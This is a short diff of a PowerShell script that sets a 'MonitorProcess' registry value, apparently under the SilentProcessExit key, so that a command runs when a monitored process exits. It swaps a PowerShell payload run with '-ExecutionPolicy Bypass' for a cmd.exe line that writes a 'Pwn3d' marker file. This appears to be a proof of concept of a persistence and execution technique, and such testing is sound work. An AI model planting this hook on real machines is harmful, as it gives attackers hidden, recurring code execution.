@@ -48,7 +48,8 @@ try {
     # MonitorProcess setzen
     New-ItemProperty -Path $spePath `
         -Name "MonitorProcess" `
-        -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -Command `"Set-Content -Path 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -Encoding UTF8`"" `
+        # -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -Command `"Set-Content -Path 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -Encoding UTF8`"" `
+        -Value "C:\Windows\System32\cmd.exe /c echo Pwn3d > C:\Users\Public\Documents\pwned.txt" `
         -PropertyType String `
         -Force
 
